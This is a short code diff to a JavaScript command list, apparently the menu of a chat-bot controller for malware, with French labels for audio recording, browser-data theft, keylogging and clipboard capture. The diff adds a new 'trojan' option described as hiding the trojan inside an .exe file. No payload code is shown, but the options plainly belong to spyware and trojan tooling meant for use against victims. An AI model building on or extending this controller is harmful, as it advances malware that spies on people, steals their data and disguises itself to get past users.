@@ -45,6 +45,10 @@ export const commands = [
                         value: 'papier',
                     },
                     {
+                        name: 'trojan',
+                        value: 'trojan',
+                    },
+                    {
                         name: 'stop',
                         value: 'stop',
                     },
@@ -106,7 +110,8 @@ export const commands = [
                     { name: 'Enregistrements audio', value: 'microphone' },
                     { name: 'Données de navigation', value: 'browserdata' },
                     { name: 'Enregistrements du clavier', value: 'keylogger' },
-                    { name: 'Récuperation presse papier', value: 'papier' }
+                    { name: 'Récuperation presse papier', value: 'papier' },
+                    { name: 'Dissimuler le trojan dans un .exe ', value: 'trojan' }
                 ],
             },
             {
